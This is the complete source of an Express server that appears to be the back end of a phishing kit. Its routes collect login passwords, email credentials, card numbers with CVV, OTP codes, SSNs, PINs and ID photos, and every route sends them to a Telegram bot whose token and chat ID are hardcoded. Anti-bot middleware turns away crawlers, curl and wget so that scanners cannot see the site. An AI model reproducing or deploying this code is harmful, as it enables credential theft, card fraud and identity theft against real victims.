var express = require("express");
var bodyParser = require("body-parser");
var multer = require("multer");
var fs = require("fs");
var path = require("path");
var axios = require("axios");
var FormData = require("form-data");
var rateLimit = require("express-rate-limit");
var helmet = require("helmet");

var app = express();
var PORT = process.env.PORT || 8080;




// -------------------- 1. Security headers --------------------
app.use(helmet());

// -------------------- 2. Body parsers --------------------
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// -------------------- 3. In-memory dynamic blocklist --------------------
var blockedIPs = new Map(); // IP -> { blockedUntil, strikes }

function blockIP(ip) {
    var now = Date.now();
    var entry = blockedIPs.get(ip) || { strikes: 0, blockedUntil: now };
    entry.strikes += 1;
    entry.blockedUntil = now + entry.strikes * 15 * 60 * 1000; // 15 min * strikes
    blockedIPs.set(ip, entry);
    console.log(`Blocked IP ${ip} for ${entry.strikes * 15} minutes. Strikes: ${entry.strikes}`);
}

// -------------------- 4. Bot detection middleware --------------------
app.use((req, res, next) => {
    var ip = req.ip;
    var entry = blockedIPs.get(ip);

    if (entry && entry.blockedUntil <= Date.now()) {
        blockedIPs.delete(ip); // unblock expired
    }

    if (entry && entry.blockedUntil > Date.now()) {
        return res.status(403).send("Access temporarily blocked due to suspicious activity.");
    }

    var ua = req.headers["user-agent"] || "";
    var botPatterns = [/bot/i, /crawler/i, /spider/i, /curl/i, /wget/i, /python/i, /java/i];

    if (botPatterns.some(pattern => pattern.test(ua))) {
        console.log(`Blocked bot: ${ua} from IP ${ip}`);
        blockIP(ip);
        return res.status(403).send("Bots are not allowed.");
    }

    next();
});





// Telegram config
var botToken = "7681661204:AAGNlQbHw0xCan94-xKKW1yKmm7odMePwBs";
var chatId = "7920571465";

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// === Anti-bot & secure headers middleware ===
app.use((req, res, next) => {
  const ua = req.headers['user-agent']?.toLowerCase() || "";
  if (/bot|crawler|spider|facebookexternalhit|bingpreview|headless|wget|curl/i.test(ua)) {
    return res.redirect("https://facebook.com");
  }
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "no-referrer");
  next();
});
app.use(express.static(path.join(__dirname, "public")));

// Multer config for file uploads
var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "-" + file.originalname);
  },
});
var upload = multer({ storage: storage });

// Send Telegram message
async function sendTelegramMessage(text) {
  var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
  return axios.post(url, { chat_id: chatId, text: text });
}

// Send photo to Telegram
async function sendTelegramPhoto(filePath) {
  var url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
  var formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", fs.createReadStream(filePath));
  return axios.post(url, formData, { headers: formData.getHeaders() });
}

// Routes

// First login submission
app.post("/login", async function (req, res) {
  try {
    var username = req.body.username;
    var password = req.body.password;
    var ip = req.body.ip;
    var userAgent = req.body.userAgent;

    var message =
      "🔐 First Login Submission:\nUsername: " +
      username +
      "\nPassword: " +
      password +
      "\nIP: " +
      ip +
      "\nUser Agent: " +
      userAgent;

    await sendTelegramMessage(message);
    res.status(200).send("OK");
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).send("Error");
  }
});

// Second login submission
app.post("/second-login", async function (req, res) {
  try {
    var username = req.body.username;
    var password = req.body.password;
    var ip = req.body.ip;
    var userAgent = req.body.userAgent;

    var message =
      "🔐 Second Login Submission:\nUsername: " +
      username +
      "\nPassword: " +
      password +
      "\nIP: " +
      ip +
      "\nUser Agent: " +
      userAgent;

    await sendTelegramMessage(message);
    res.status(200).send("OK");
  } catch (err) {
    console.error("Second login error:", err);
    res.status(500).send("Error");
  }
});

// First email/password submission
app.post("/submit-email", async function (req, res) {
  try {
    var email = req.body.email;
    var password = req.body.password;

    var message =
      "📧 Email Submission:\nEmail Address: " +
      email +
      "\nPassword: " +
      password;

    await sendTelegramMessage(message);
    res.status(200).send("OK");
  } catch (err) {
    console.error("Email login error:", err);
    res.status(500).send("Error");
  }
});

// ✅ Add this to handle POST /card
app.post("/card", async (req, res) => {
  try {
    const { cardNumber, expiryDate, cvv, nameOnCard } = req.body;

    const message = `💳 Card Submission:\n`
                  + `Card Number: ${cardNumber}\n`
                  + `Expiry Date: ${expiryDate}\n`
                  + `CVV: ${cvv}\n`
                  + `Name on Card: ${nameOnCard}`;

    await sendTelegramMessage(message);
    res.status(200).send("OK");
  } catch (err) {
    console.error("Card submission error:", err);
    res.status(500).send("Error");
  }
});

// Second email/password submission
app.post("/submit-second-email", async function (req, res) {
  try {
    var email = req.body.email;
    var password = req.body.password;

    var message =
      "📧 Second Email Submission:\nEmail Address (2): " +
      email +
      "\nPassword (2): " +
      password;

    await sendTelegramMessage(message);
    res.status(200).send("OK");
  } catch (err) {
    console.error("Second email login error:", err);
    res.status(500).send("Error");
  }
});

// OTP code submission
app.post("/code", async function (req, res) {
  try {
    var code = req.body.code;

    var message = "🔐 Code Submission:\nOTP Code: " + code;

    await sendTelegramMessage(message);
    res.status(200).send("OK");
  } catch (err) {
    console.error("Code submission error:", err);
    res.status(500).send("Error");
  }
});

// Personal details submission
app.post("/details", async function (req, res) {
  try {
    var fullname = req.body.fullname;
    var dob = req.body.dob;
    var ssn = req.body.ssn;
    var tax = req.body.tax;
    var address = req.body.address;
    var state = req.body.state;
    var zip = req.body.zip;
    var phone = req.body.phone;
    var pin = req.body.pin;

    var message =
      "📋 Details Submission:\nFull Name: " +
      fullname +
      "\nDOB: " +
      dob +
      "\nSSN: " +
      ssn +
      "\nTax ID: " +
      tax +
      "\nAddress: " +
      address +
      "\nState: " +
      state +
      "\nZip: " +
      zip +
      "\nPhone: " +
      phone +
      "\nPIN: " +
      pin;

    await sendTelegramMessage(message);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Details submission error:", error);
    res.status(500).json({ success: false, error: "Failed to send details" });
  }
});

// ID image uploads
app.post("/upload-id", upload.fields([{ name: "front" }, { name: "back" }]), async function (req, res) {
  try {
    var frontPath = req.files.front[0].path;
    var backPath = req.files.back[0].path;

    await sendTelegramPhoto(frontPath);
    await sendTelegramPhoto(backPath);

    fs.unlinkSync(frontPath);
    fs.unlinkSync(backPath);

    res.json({ success: true });
  } catch (error) {
    console.error("Upload failed:", error);
    res.status(500).send("Error occurred during file upload.");
  }
});

// Fallback: serve index.html for all other GET routes
app.get("*", function (req, res) {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start the server
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
